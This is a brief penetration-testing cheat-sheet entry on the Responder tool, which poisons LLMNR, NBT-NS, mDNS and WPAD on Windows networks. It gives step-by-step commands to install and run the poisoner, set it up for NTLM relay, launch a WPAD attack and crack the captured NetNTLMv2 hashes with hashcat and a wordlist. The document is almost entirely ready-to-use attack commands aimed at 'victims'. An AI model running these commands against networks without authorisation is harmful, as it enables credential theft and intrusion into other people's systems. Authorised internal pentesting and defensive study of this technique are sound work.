# 03.30 Responder

> LLMNR NBT-NS mDNS poisoner — capture NetNTLMv1/v2 hashes from misconfigured Windows networks.

## Overview

Responder listens on multiple Windows-default broadcast protocols (LLMNR, NBT-NS, mDNS, WPAD) and answers as the requested service. Misconfigured Windows hosts will then send NTLM auth to Responder, leaking NetNTLMv2 hashes (crackable offline). Pair with ntlmrelayx for live relay. Critical for internal pentest — most Windows networks STILL have LLMNR enabled.

## Steps

- **Step 1** - Install (preinstalled on Kali).
- **Step 2** - Configure (disable SMB/HTTP if relaying instead).
- **Step 3** - Wait for victims to fail name resolution.
- **Step 4** - Crack captured hashes with hashcat -m 5600.

## Commands

### Install

```bash
sudo apt install -y responder
```

### Basic run

```bash
sudo responder -I <NIC> -wd
```

### Analyze mode (listen only)

```bash
sudo responder -I <NIC> -A
```

### Disable SMB/HTTP for relay use

```bash
# Edit /etc/responder/Responder.conf:
# SMB = Off
# HTTP = Off
sudo responder -I <NIC> -wd
```

### WPAD attack (browser auth)

```bash
sudo responder -I <NIC> -wdF
```

### Crack captured hashes

```bash
# Hashes saved to /usr/share/responder/logs/
hashcat -m 5600 /usr/share/responder/logs/SMB-NTLMv2-SSP-<IP>.txt /usr/share/wordlists/rockyou.txt
```
